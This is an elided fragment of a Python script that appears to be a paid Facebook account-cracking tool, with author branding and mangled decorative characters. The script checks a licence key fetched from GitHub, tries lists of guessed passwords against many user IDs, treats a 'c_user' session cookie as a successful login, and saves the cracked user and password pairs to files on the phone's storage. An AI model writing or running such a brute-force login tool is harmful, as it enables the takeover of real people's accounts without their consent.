...
def main_apv():
    ...
    r1=requests.get("https://github.com/MR-K1NGX/KINGX/blob/main/KINGX.txt").text
    ...
    if key1 in r1:
        ...
        print ("         à¼„â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢à¼„")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL SW4TI")     
...
[â€¢]FACEBOOK       : \033[1;33mRaziqullah saadat\033[1;33m
[â€¢]YOUTUBE        : \033[1;32m Saadat TRICKS\033[1;32m
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[RAH-SAADAT]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AB-KHANX-OK ðŸ’¥] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/SAADAT_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/SAADAT_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print ("\033[1;37m\r   Exmple : 123 + 12345 + 1234 + 1122 + kabul123 + afghan123 \033[1;37m\n")
